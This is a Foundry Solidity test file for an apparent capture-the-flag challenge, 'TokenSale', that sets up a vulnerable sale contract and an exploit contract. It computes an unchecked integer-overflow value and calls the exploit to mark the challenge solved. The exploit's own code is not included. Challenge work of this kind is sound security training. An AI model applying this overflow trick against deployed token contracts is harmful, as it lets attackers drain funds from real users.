// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenSale.sol";

contract TokenSaleTest is Test {
    TokenSale public tokenSale;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        tokenSale = (new TokenSale){value: 1 ether}();
        exploitContract = new ExploitContract(tokenSale);
        vm.deal(address(exploitContract), 4 ether);
    }

    // Use the instance of tokenSale and exploitContract
//     584007913129639935
    function testIncrement() public {
        // Put your solution here
        uint256 number;
        unchecked {
            number = (((UINT256_MAX+584007913129639935) / 1 ether)) * 1 ether;

            // 2**256 / 10**18
        }
        console.log(number);
        console.log(UINT256_MAX-1);

        exploitContract.exploit{value: 0 ether}();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenSale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
